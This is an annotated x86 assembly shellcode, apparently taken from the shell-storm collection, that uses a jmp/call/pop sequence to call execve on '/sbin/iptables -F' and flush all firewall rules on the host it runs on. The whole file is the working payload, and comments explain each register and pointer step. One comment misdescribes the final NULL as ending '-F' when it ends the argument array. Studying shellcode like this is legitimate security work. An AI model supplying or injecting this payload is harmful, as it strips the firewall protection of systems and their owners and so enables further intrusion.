; The shellcode flushs the iptables  by running /sbin/iptables -F
; http://shell-storm.org/shellcode/files/shellcode-361.php
; Author: dev0id

jmp	short	callme

main:
	pop esi									; esi points to '/sbin/iptables#-F#' (0x80480a8)
	xor eax,eax
	mov byte [esi+14],al		; '#' replaced with \0
	mov byte [esi+17],al		; '#' replaced with \0
	mov long [esi+18],esi		; esi points to '/sbin/iptables0-F0\xa8\x80\x04\x08 (esi address 0x80480a8)'
	lea ebx,[esi+15]				; ebx points to '-F' option (0x80480b7)
	mov long [esi+22],ebx		; esi points to '/sbin/iptables\0-F\0\xa8\x80\x04\x08\xb7\x80\x04\x08 (ptr to '/sbin/iptables' and ptr to '-F')
	mov long [esi+26],eax		; NULL terminate '-F'
	mov al,0x0b							; eax = execve() syscall
	mov ebx,esi							; ebx points to '/sbin/iptables\0'
	lea ecx,[esi+18]				; ecx points to 0x80480ba which points to an array of pointers: [0x80480a8, 0x80480b7] which points to ['/sbin/iptables', '-F']
	lea edx,[esi+26]				; edx points to NULL
	int 0x80								; syscall


callme:
	call	main
	db '/sbin/iptables#-F#'
